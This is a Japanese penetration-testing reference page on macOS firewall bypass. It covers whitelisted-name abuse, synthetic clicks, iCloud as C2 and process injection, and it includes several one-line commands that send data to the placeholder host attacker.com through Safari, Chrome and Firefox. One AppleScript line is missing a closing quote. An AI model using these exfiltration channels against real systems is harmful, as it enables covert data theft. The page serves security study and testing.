# macOS ファイアウォールのバイパス

{{#include ../../banners/hacktricks-training.md}}

## 発見された技術

以下の技術は、いくつかの macOS ファイアウォールアプリで動作することが確認されました。

### ホワイトリスト名の悪用

- 例えば、**`launchd`** のようなよく知られた macOS プロセスの名前でマルウェアを呼び出すこと。

### 合成クリック

- ファイアウォールがユーザーに許可を求める場合、マルウェアに **許可をクリックさせる**。

### **Apple 署名のバイナリを使用**

- **`curl`** のようなもの、他にも **`whois`** など。

### よく知られた Apple ドメイン

ファイアウォールは、**`apple.com`** や **`icloud.com`** のようなよく知られた Apple ドメインへの接続を許可している可能性があります。そして、iCloud は C2 として使用される可能性があります。

### 一般的なバイパス

ファイアウォールをバイパスするためのいくつかのアイデア。

### 許可されたトラフィックの確認

許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されたドメインや、どのアプリケーションがそれらにアクセスできるかを特定するのに役立ちます。
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの悪用

DNS解決は、DNSサーバーに接続することが許可されている可能性が高い**`mdnsreponder`**署名アプリケーションを介して行われます。

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ブラウザアプリを介して

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- グーグルクローム
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- ファイアフォックス
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- サファリ
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクションを介して

接続を許可された**プロセスにコードを注入**できれば、ファイアウォールの保護を回避できます：

{{#ref}}
macos-proces-abuse/
{{#endref}}

## 参考文献

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
